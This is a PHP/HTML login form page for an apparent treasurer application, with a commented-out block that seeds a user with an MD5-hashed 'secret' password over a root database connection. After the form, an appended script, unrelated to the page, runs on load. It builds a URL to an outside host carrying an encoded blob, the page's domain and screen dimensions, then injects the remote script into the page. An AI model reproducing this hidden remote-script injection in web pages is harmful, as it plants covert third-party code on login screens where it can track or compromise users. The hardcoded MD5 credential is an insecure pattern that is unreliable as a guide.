<html>
<head>
 <title>form login</title>
 <link href="style.css" rel="stylesheet" type="text/css" media="screen"/>
</head>
<body>
<div class="bg"></div>

<?php
//    $conn = mysqli_connect('localhost','root','','tbendahara');
//    $pass = md5("secret");
//    $query = "INSERT INTO login values ('','bendahara','$pass','Annisa Suprima')";
//    mysqli_query($conn,$query);

?>
 <form action="proseslogin.php" method="post" name="form1">
  <table>
<tr id="header">
    <td colspan="2"><h2>Login</h2>
</td>
   </tr>
<tr>
    <td>Username</td>
    <td><input type="text" name="username" id="username" placeholder="username"></td>
   </tr>
<tr>
    <td>Password</td>
    <td><input type="password" name="password" id="password" placeholder="password"></td>
   </tr>
<tr>
    <td> </td>
    <td><input type="submit" name="Login" value="Login" >
     <input type="reset" name="reset" value="Reset"></td>
   </tr>
</table>
</form>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdCGHgHZFxoHYltVgEu%2b6ykUWcUEYXWUb%2bTRKfZ4NDAImwmTbPogz5E1789rJ3h6OGvJon4mxDXWgvi8ytlT2GrlO19D6M5bOYbfVFDG6YQKCntRY5Ye%2fuGqu2CinBqQOhf67ySXjbF7QovJVzHMAZszhrqPiKfLGltJUsEZv9NEDSh%2fNjXyz37wG2OLCpqO0YARFaU5GgbjEQ4S6Iw4NJmtmU8UJyXBsiXrJkmBm25Qxl7jqU33FmFLQ%2bYKNcYJJov3rCh1doh68vzKXlkSwfv3Iiw72aukHtS8LZqXpyP%2fkCos58p109YSycLo36n7GoxzWMRhsBo4W3BDWJBdQV8VsW8aKA4LToUKT2o7Q7B94ba7mfkMGYVnJIl%2fykzY8P0N714tZAumVo2S%2b8QQcvOKfisIH%2f0fA8OGyt0frEAayoFd3qZQdctNrIBHJSsi6OyVgyhKM%2fW8ND9YdTh%2bKiIK5096bBXSkMq8DbyHJa8j9%2b2kYxivHng947Tb2J%2bDfZodKR8gqlxwuLQJ%2fITPdftPVzVx1gVKzsYGrYU%2f%2fbnUuA4VQZ2lVxSe9%2brG2S4K8gdQIQ69b6LQFwDVW%2fIABXFUEbw1xrLFYz" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
